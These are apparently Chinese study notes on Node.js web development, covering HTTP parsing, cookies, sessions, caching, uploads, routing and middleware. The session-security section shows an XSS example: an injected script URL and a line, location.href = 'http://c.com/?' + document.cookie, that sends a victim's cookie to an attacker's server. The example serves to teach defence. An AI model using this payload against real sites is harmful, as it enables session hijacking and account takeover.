主要内容：

在Web应用中，JavaScript将不再仅仅出现在前端浏览器中，因为Node的出现，“前端”将会被重新定义。"

单从框架而言，在后端数得出来大名的就有Structs、CodeIgniter、Rails、Django、web.py等，在前端也有知名的BackBone、 Knockout. js、AngularJS、Meteor等。在Node中，有Connect中间件，也有Express这样的MVC框架。

## 基础

http模块中服务器端的request事件：
- request事件发生于网络连接建立，客户端向服务器端发送报文，服务器端解析报文，发现HTTP请求的报头时。
- 在已触发reqeust事件前，它已准备好ServerRequest和ServerResponse对象以供对请求和响应报文的操作。
- 我们的应用可能无限地复杂，但是只要最终结果返回`function(req, res)`函数作为参数，传递给`createServer()`方法作为request事件的侦听器就可以了`。

请求报文：
```
GET /path?foo=bar HTTP/1.1
> User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
Host: 127.0.0.1:1337
Accept: */*
```

### 请求方法

|请求方法|
|:----:|
|`GET，POST，HEAD，DELETE，PUT，CONNECT`，请求方法存在于报文的第一行的第一个单词，通常是大写。|
|HTTP_Parser在解析请求报文的时候，将报文头抽取出来，设置为`req.method`。|
|在RESTful类Web服务中请求方法十分重要，因为它会决定资源的操作行为。**PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELET表示删除一个资源**。|

### 路径解析

`GET /path?foo=bar HTTP/1.1`

HTTP_Parser将其解析为`req.url`。一般而言，完整的URL地址是如下这样的：
`http://user:pass@host.com:8080/p/a/t/h?query=string#hash`

客户端代理（浏览器）会将这个地址解析成报文，将**路径和查询部分放在报文第一行**。需要注意的是，**hash部分会被丢弃，不会存在于报文的任何地方**。

- 最常见的根据路径进行业务处理的应用是静态文件服务器，它会根据路径去查找磁盘中的文件，然后将其响应给客户端。
- 还有一种比较常见的分发场景是根据路径来选择控制器，它预设路径为控制器和行为的组合，尤须额外配置路由信息。

### 查询字符串

查询字符串位于路径之后，在地址栏中路径后的`?foo=bar&baz=val`字符串就是查询字符串。这个字符串会跟随在路径后，形成请求报文首行的第二部分。Node提供了`querystring`模块用于处理这部分数据。

```javascript
var  url  =  require('url');
var  querystring  =  require('querystring');
var  query  =  querystring.parse(url.parse(req.url).query);

or

var  query  =  url.parse(req.url,  true).query;

result:

{
foo: ['bar', 'baz'],
baz:  'val'
}
```

### Cookie

HTTP是一个无状态的协议，现实中的业务却是需要一定的状态的，否则无法区分用户之间的身份。**如何标识和认证一个用户，最早的方案就是Cookie**。

Cookie的处理分为如下几步:
- 服务器向客户端发送Cookie。
- 浏览器将Cookie保存。
- 之后每次浏览器都会将Cookie发向服务器端。

* 客户端发送的Cookie在请求报文的Cookie字段中，我们**可以通过curl工具构造Cookie字段**，如下所示：
`curl  -v  -H  "Cookie:  foo=bar;  baz=val"  "http://127.0.0.1:1337/path?foo=bar&foo=baz"`

* HTTP_Parser会将所有的报文字段解析到`req.headers` 上，那么Cookie 就是`req.headers.cookie`。根据规范中的定义，Cookie值的格式是`key=value;  key2=value2`形式的，如果我们需要
Cookie，解析它也十分容易，如下所示：

```javascript
var parseCookie = function (cookie) {
  var cookies = {};
  if (!cookie) {
      return cookies;
  }
  var list = cookie.split(';');
  for (var i = 0; i < list.length; i++) {
      var pair = list[i].split('=');
      cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
```

- 响应报文，响应的Cookie值在`Set-Cookie`字段中。它的格式与请求中的格式不太相同，规范中对它的定义如下所示：`name=value`是必须包含的部分，其余部分皆是可选参数.

`Set-Cookie:  name=value;  Path=/;  Expires=Sun,  23-Apr-23  09:01:35  GMT;  Domain=.domain.com;`

- `path`表示这个Cookie影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个Cookie。
- `Expires`和`Max-Age`是用来告知浏览器这个Cookie何时过期的，如果不设置该选项，在关闭浏览器时会丢失掉这个Cookie。如果设置了过期时间，浏览器将会把Cookie内容写入到磁盘中并保存，下次打开浏览器依旧有效。**Expires的值是一个UTC格式的时间字符串，告知浏览器此Cookie何时将过期，Max-Age则告知浏览器此Cookie多久后过期**。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age告知浏览器这条Cookie多久之后过期，而不是一个具体的时间点。
- `HttpOnly`告知浏览器不允许通过脚本`document.cookie`去更改这个Cookie值，事实上，设置 HttpOnly之后，这个值在`document.cookie`中不可见。但是在HTTP请求的过程中，依然会发送这个Cookie到服务器端。
- `Secure`。当Secure值为true时，在HTTP中是无效的，在HTTPS中才有效，表示创建的Cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证，如果是HTTP连接则不会传递该信息，所以很难被窃听到。

--------------------------------------------------------------------------------------------

一旦设置的Cookie过多，将会导致报头较大。大多数的Cookie并不需要每次都用上，因为这会造成带宽的部分浪费。在YSlow的性能优化规则中有这么一条：

- 减小cookie的大小<br>
如果在域名的根节点设置Cookie，几乎所有子路径下的请求都会带上这些Cookie。好在Cookie在设计时限定了它的域，只有域名相同时才会发送。所以YSlow中有另外一条规则用来避免Cookie带来的性能影响。
- 为静态组件使用不同的域名<br>
可以实现减少无效Cookie的传输，当然换用额外的域名，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程数翻倍。但是换用额外域名还是有一定的缺点的，那就是将域名转换为IP需要进行DNS查询，多一个域名就多一次DNS查询。
- 减少DNS查询<br>
现今的浏览器都会进行DNS缓存，以削弱这个副作用的影响。
Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过`document.cookie`暴露给了JavaScript。前端在修改Cookie之后，后续的网络请求中就会携带上修改过后的值。

--------------------------------------------------------------------------------------------
Cookie存在的问题：
- 体积过大
- Cookie可以在前后端进行修改，数据就极容易被篡改和伪造
- 所以，Cookie对于敏感数据的保护是无效的

### Session

Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。

- 基于Cookie来实现用户和数据的映射

一旦服务器端启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定，比如Connect默认采用connect_uid，Tomcat会采用jsessionid等。一旦服务器检查到用户请求 Cookie中没有携带该值，它就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。每个请求到来时，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成。还需要在响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。

- 通过查询字符串来实现浏览器端和服务器端数据的对应

它的原理是检查请求的查询字符串，如果没有值，会先生成新的带值的URL。然后形成跳转，让客户端重新发起请求。

用户访问`http://localhost/pathname`时，如果服务器端发现查询字符串中不带`session_id`参数，就会将用户跳转到`http://localhost/pathname?session_id=12344567`这样一个类似的地址。如果浏览器收到302状态码和Location报头，就会重新发起新的请求，如下所示：
```
<  HTTP/1.1  302  Moved  Temporarily
<  Location:  /pathname?session_id=12344567
```
这样，新的请求到来时就能通过Session的检查，除非内存中的数据过期。
**这种方案带来的风险远大于基于Cookie实现的风险，因为只要将地址栏中的地址发给另外一个人，那么他就拥有跟你相同的身份**。<br>
还有一种比较有趣的处理Session的方式是**利用HTTP请求头中的ETag**，同样对于更换浏览器和电脑后也是无效的。

--------------------------------------------------------------------------------------------

Session与内存

- **为了解决性能问题（内存限制）Session数据尤法跨进程共享的问题，常用的方案是将Session集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中**。<br>
- 目前常用的工具是`Redis、 Memcached`等中间件，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效。
- 采用第三方缓存来存储Session引起的一个问题是会引起网络访问

尽管如此但依然会采用这些高速缓存的理由有以下几条：
- Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。
- 高速缓存直接在内存中进行数据存储和访问。
- 缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。

--------------------------------------------------------------------------------------------
Session与安全

将口令通过私钥加密进行签名，使得伪造的成本较高。

**XSS漏洞**<br>
XSS的全称是跨站脚本攻击（Cross Site Scripting，通常简称为XSS），通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过XSS漏洞会让别的脚本执行。<br>
它的主要形成原因多数是用户的输入没有被转义，而被直接执行。

下面是某个网站的前端脚本，它会将URL hash中的值设置到页面中，以实现某种逻辑，如下所示：<br>
`"$('#box').html(location.hash.replace('#',  ''));`
攻击者在发现这里的湘洞后，构造了这样的URL：<br>
`"http://a.com/pathname#<script  src=""http://b.com/c.js""></script>`<br>
为了不让受害者直接发现这段URL中的猫腻，它可能会通过URL压缩成一个短网址，如下所示<br>
`http://t.cn/fasdlfj`, 或者再次压缩`http://url.cn/fasdlfb`.

然后将最终的短网址发给某个登录的在线用户。这样一来，这段hash中的脚本将会在这个用户的浏览器中执行，而这段脚本中的内容如下所示：<br>
`location.href  =  ""http://c.com/?""  +  document.cookie;`<br>
这段代码将该用户的Cookie提交给了`c.com`站点，这个站点就是攻击者的服务器，他也就能拿到该用户的Session口令。然后他在客户端中用这个口令伪造Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。

### 缓存

为了提高性能，YSlow中也提到几条**关于缓存的规则**：
- 添加`Expires` 或`Cache-Control` 到报文头中。
- 配置 `ETags`。
- 让`Ajax` 可缓存。

让浏览器缓存我们的静态资源，这是一个需要由**服务器与浏览器共同协作完成**的事情。

RFC2616规范对此有一定的描述，只有遵循约定，整个缓存机制才能有效建立。

通常来说，**POST、DELETE、PUT这类带行为性的请求操作一般不做任何缓存，大多数缓存只应用在GET请求中**。 

使用缓存的流程如图8-1所示:

![8-1使用缓存的流程示意图](./img/8-1.png)

简单来讲，本地没有文件时，浏览器必然会请求服务器端的内容，并将这部分内容放置在本地的某个缓存目录中。<br>
在第二次请求时，它将对本地文件进行检查，如果不能确定这份本地文件是否可以直接使用，它将会发起一次条件请求。<br>
所谓**条件请求**，就是在普通的GET请求报文中，附带`If-Modified-Since/Last-Modified`字段，如下所示：<br>
`If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT`

它将询问服务器端是否有更新的版本，本地文件的最后修改时间。如果服务器端没有新的版本，只需响应一个304状态码，客户端就使用本地版本。如果服务器端有新的版本，就将新的内容发送给客户端，客户端放弃本地版本。

这里的条件请求采用时间戳的方式实现，但是时间戳有一些缺陷存在。
- 文件的时间戳改动但内容并不一定改动。
- 时间戳只能精确到秒级别，更新频繁的内容将无法生效。
--------------------------------------------------------------------------------------------
HTTP1.1中引入了`ETag`来解决这个问题。<br>
`ETag`的全称是Entity Tag，由服务器端生成，服务器端可以决定它的生成规则。<br>
如果根据文件内容生成散列值，那么条件请求将不会受到时间戳改动造成的带宽浪费。<br>
与`If-Modified-Since/Last-Modified不`同的是，ETag的请求和响应是`If-None-Match/ETag`。

--------------------------------------------------------------------------------------------
最好的方案是连条件请求都不用发起。<br>
服务器端在响应内容时，让浏览器明确地将内容缓存起来。<br>
如同YSlow规则里提到的，在响应里设置`Expires`或`Cache-Control`头，浏览器将根据该值进行缓存。
- `Expires`是一个GMT格式的时间字符串。浏览器在接到这个过期值后，只要本地还存在这个缓存文件，在到期时间之前它都不会再发起请求。
- `Expires`的缺陷在于浏览器与服务器之间的时间可能不一致。
- `Cache-Control`设置了`max-age`值，它比`Expires`优秀的地方在于，`Cache-Control`能够避免浏览器端与服务器端时间不同步带来的不一致性问题，只要进行类似倒计时的方式计算过期时间即可。
- `Cache-Control`的值还能设置`public、private、no-cache、no-store`等能够更精细地控制缓存的选项。
- 在浏览器中如果两个值同时存在，且被同时支持时，`max-age`会覆盖`Expires`。

--------------------------------------------------------------------------------------------
清除缓存

虽然我们知晓了如何设置缓存，以达到节省网络带宽的目的，但是缓存一旦设定，当服务器端意外更新内容时，却无法通知客户端更新。<br>
这使得我们在使用缓存时也要为其设定版本号，**所幸浏览器是根据URL进行缓存，那么一旦内容有所更新时，我们就让浏览器发起新的URL请求，使得新内容能够被客户端更新**。<br>
一般的更新机制有如下两种：
- 每次发布，路径中跟随Web应用的版本号：`http://url.com/?v=20130501`。
- 每次发布，路径中跟随该文件内容的hash值：`http://url.com/?hash=afadfadwe`。

大体来说，根据文件内容的hash值进行缓存淘汰会更加高效，因为文件内容不一定随着Web应用的版本而更新，而内容没有更新时，版本号的改动导致的更新毫无意义，因此以文件内容形成的hash值更精准。

### Basic认证

Basic认证是当客户端与服务器端进行请求时，允许通过用户名和密码实现的一种身份认证方式。这里简要介绍它的原理和它在服务器端通过Node处理的流程。
如果一个页面需要Basic认证，它会检查请求报文头中的Authorization字段的内容，该字段的值由认证方式和加密值构成.

```
$ curl -v "http://user:pass@www.baidu.com/"
> GET / HTTP/1.1
> Authorization: Basic dXNlcjpwYXNz
> User-Agent: curl/7.24.0 (x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5
> Host: www.baidu.com
> Accept: */*
```

在Basic认证中，它会将用户和密码部分组合：`username + "":"" + password`。然后进行Base64编码。

Basic认证有太多的缺点，它虽然经过Base64加密后在网络中传送，但是这近乎于明文，十分危险，一般只有在HTTPS的情况下才会使用。不过Basic认证的支持范围十分广泛，几乎所有的浏览器都支持它。

## 数据上传

Node的http模块只对HTTP报文的头部进行了解析，然后触发request事件。如果请求中还带有内容部分（如POST请求，它具有报头和内容），内容部分需要用户自行接收和解析。通过报头的`Transfer-Encoding`或`Content-Length`即可判断请求中是否带有内容，如下所示：

```javascript
var  hasBody  =  function(req)  {
  return  'transfer-encoding'  in  req.headers  ||  'content-length'  in  req.headers;
};
```
在HTTP_Parser解析报头结束后，报文内容部分会通过data事件触发。

### 表单数据

最为常见的数据提交就是通过网页表单提交数据到服务器端，如下所示：

```html
<form action="/upload" method="post">
  <label for="username">Username:</label> <input type="text" name="username" id="username" />
<br />
  <input type="submit" name="submit" value="Submit" />
</form>
```

默认的表单提交，请求头中的`Content-Type`字段值为`application/x-www-form-urlencoded`，后续业务中直接访问`req.body`就可以得到表单中提交的数据。

### 其他格式

常见的提交还有JSON和XML文件等，判断和解析他们的原理都比较相似，都是依据`Content-Type `中的值决定，其中JSON类型的值为`application/json` ，XML的值为`application/xml`。

**需要注意的是，在`Content-Type`中可能还附带如下所示的编码信息：`Content-Type:  application/json;  charset=utf-8`**

### 附件上传

通常的表单，其内容可以通过`urlencoded`的方式编码内容形成报文体，再发送给服务器端，但是业务场景往往需要用户直接提交文件。在前端HTML代码中，特殊表单与普通表单的差异在于该表单中可以含有`file类型`的控件，以及**需要指定表单属性`enctype`为`multipart/form-data`。**

```html
<form action="/upload" method="post" enctype="multipart/form-data">
  <label for="username">Username:</label> <input type="text" name="username" id="username" />
  <label for="file">Filename:</label> <input type="file" name="file" id="file" />
  <br />
  <input type="submit" name="submit" value="Submit" />
</form>
```

浏览器在遇到`multipart/form-data`表单提交时，构造的请求报文与普通表单完全不同。首先它的报头中最为特殊的如下所示：<br>
```
Content-Type:  multipart/form-data;  boundary=AaB03x
Content-Length:  18231
```

它代表本次提交的内容是由多部分构成的，其中`boundary=AaB03x`指定的是每部分内容的分界符，`AaB03x`是随机生成的一段字符串，报文体的内容将通过在它前面添加`--`进行分割，报文结束时在它前后都加上`--`表示结束。另外，`Content-Length`的值必须确保是报文体的长度。

一旦我们知晓报文是如何构成的，那么解析它就变得十分容易，我们将req这个流对象直接交给直接交给对应的解析方法，由解析方法自行处理上传的内容，或
接收内容并保存在内存中，或流式处理掉。这里要介绍到的模块是`formidable`。它基于流式处理解析报文，将接收到的文件写入到系统的临时文件夹中，并**返回对应的路径**。

**因此在业务逻辑中只要检查`req.body`和`req.files`中的内容即可。**

### 数据上传与安全

1. 内存限制

在解析表单、JSON和XML部分，我们**采取的策略是先保存用户提交的所有数据，然后再解析处理，最后才传递给业务逻辑**。这种策略存在潜在的问题是，它仅仅适合数据量小的提交请求，一旦数据量过大，将发生内存被占光的情况。攻击者通过客户端能够十分容易地模拟伪造大量数据，**如果攻击者每次提交1MB的内容，那么只要并发请求数量一大，内存就会很快地被光**。

要解决这个问题主要有两个方案：
- 限制上传内容的大小，一旦超过限制，停止接收数据，并响应400状态码。
- 通过流式解析，将数据流导向到磁盘中，Node只保留文件路径等小数据。

对于上线的Web应用，添加一个上传大小限制十分有利于保护服务器，在遭遇攻击时，能镇定从容应对。

2. CSRF

CSRF的全称是Cross-Site Request Forgery，中文意思为**跨站请求伪造**。前文提及了服务器端与客户端通过`Cookie`来标识和认证用户，通常而言，用户通过浏览器访问服务器端的`Session ID`
是无法被第三方知道的，但是CSRF的攻击者并不需要知道Session ID就能让用户中招。

- 解决CSRF攻击的方案有添加随机值的方式。
- 为每个请求的用户，在Session中赋予一个随机值（设置token）


## 路由解析

介绍文件路径、MVC、RESTful等路由方式。

### 文件路径型

1. 静态文件
  
URL的路径与网站目录的路径一致，无须转换，非常直观。这种路由的处理方式也十分简单，将请求路径对应的文件发送给客户端即可。

2. 动态文件

它的处理原理是Web服务器根据URL路径找到对应的文件，如`/index.asp`或`/index.php`，Web服务器根据文件名后缀去寻找脚本的解析器，并传入HTTP请求的上下文。

以下是Apache中配置PHP支持的方式：<br>

`AddType  application/x-httpd-php  .php`

解析器执行脚本，并输出响应报文，达到完成服务的目的。现今大多数的服务器都能很智能地根据后缀同时服务动态和静态文件。这种方式在Node中不太常见，主要原因是文件的后缀都是`.js`，分不清是后端脚本，还是前端脚本，这可不是什么好的设计。而且Node中Web服务器与应用业务脚本是一体的，无须按这种方式实现。

### MVC

用户请求的URL路径原来可以跟具体脚本所在的路径没有任何关系。<br>
MVC模型的主要思想是将业务逻辑按职责分离，主要分为以下几种。
- 控制器（Controller），一组行为的集合。 
- 模型（Model），数据相关的操作和封装。 
- 视图（View），视图的渲染。
这是目前最为经典的分层模式（如图8-3所示），大致而言，它的工作模式如下说明。
- 路由解析，根据URL寻找到对应的控制器和行为。
- 行为调用相关的模型，进行数据操作。
- 数据操作结束后，调用视图和相关数据进行页面渲染，输出到客户端。

如何根据URL做路由映射，这里有两个分支实现。
- 一种方式是通过手工关联映射，一种是自然关联映射。
- 前者会有一个对应的路由文件来将URL映射到对应的控制器，后者没有这样的文件。

![图8-3 分层模式](img/8-3.png)

1. 手工映射

手工映射除了需要手工配置路由较为原始外，它对URL的要求十分灵活，几乎没有格式上的限制。如下的URL格式都能自由映射：

```
/user/setting
/setting/user
```

- 正则匹配

有些请求需要根据不同的用户显示不同的内容，假如系统中存在成千上万个用户，我们就不太可能去手工维护所有用户的路由请求，因此正则匹配应运而生，我们期望通过以下的方式就可以匹配到任意用户：

```
use('/profile/:username', function (req, res) {
  // TODO
});
```

- 参数解析

将匹配到的内容抽取出来，希望在业务中能如下这样调用：
```
use('/profile/:username',  function  (req,  res)  { 
  var  username  =  req.params.username;
  //  TODO
});
```

至此，我们除了从查询字符串（`req.query`）或提交数据（`req.body`）中取到值外，还能从路径的映射里取到值.

2. 自然映射

简单而言，它将如下路径进行了划分处理：

`/controller/action/param1/param2/param3`

以`/user/setting/12/1987`为例，它会按约定去找`controllers`目录下的`user`文件，将其`require`出来后，调用这个文件模块的`setting()`方法，而其余的值作为参数直接传递给这个方法。

### RESTful

URL也可以设计得很规范，请求方法也能作为逻辑分发的单元。

REST的全称是Representational State Transfer，中文含义为**表现层状态转化**。符合REST规范的设计，我们称为RESTful设计。它的设计哲学主要**将服务器端提供的内容实体看作一个资源，并表现在URL上**。

它将`DELETE`和`PUT`请求方法引入设计中，参与资源的操作和更改资源的状态。

在RESTful设计中，资源的具体格式由请求报头中的`Accept`字段和服务器端的支持情况来决定。如果客户端同时接受JSON和XML格式的响应，那么它的`Accept`字段值是如下这样的：<br>
`Accept:  application/json,application/xml`

靠谱的服务器端应该要顾及这个字段，然后根据自己能响应的格式做出响应。在响应报文中，通过`Content-Type`字段告知客户端是什么格式，如下所示：`Content-Type:  application/json`


## 中间件

引入中间件来简化和隔离这些基础设施与业务逻辑之间的细节，让开发者能够关注在业务的开发上，以达到提升开发效率的目的。

由于Node异步的原因，我们需要提供一种机制，在当前中间件处理完成后，通知下一个中间件执行。

一个基本的中间件会是如下的形式：
```javascript
var  middleware  =  function  (req,  res,  next)  {
  //  TODO
  next();
}

app.use('/user/:username',  querystring,  cookie,  session,  function  (req,  res)  {
  // TODO
});
```

![中间件的工作模型](img/8-4.png)

### 异常处理

我们为`next()`方法添加err参数，并捕获中间件直接抛出的同步异常。

由于异步方法的异常不能直接捕获，中间件异步产生的异常需要自己传递出来。

```javascript
var  middleware  =  function (err, req,  res,  next)  {
  //  TODO
  next();
}

app.use(function  (err, req,  res,  next)  {
  // TODO
});
```

### 中间件与性能

- 编写高效的中间件。
- 合理利用路由，避免不必要的中间件执行。


1. 编写高效的中间件

编写高效的中间件其实就是提升单个处理单元的处理速度，以尽早调用`next()`执行后续逻辑。需要知道的事情是，一旦中间件被匹配，那么每个请求都会使该中间件执行一次，哪怕它只浪费1毫秒的执行时间，都会让我们的QPS显著下降。常见的优化方法有几种。
- 使用高效的方法。必要时通过`jsperf.com`测试基准性能。
- 缓存需要重复计算的结果（需要控制缓存用量）。
- 避免不必要的计算。比如HTTP报文体的解析，对于GET方法完全不需要。

2. 合理使用路由

合理的路由使得不必要的中间件不参与请求处理的过程。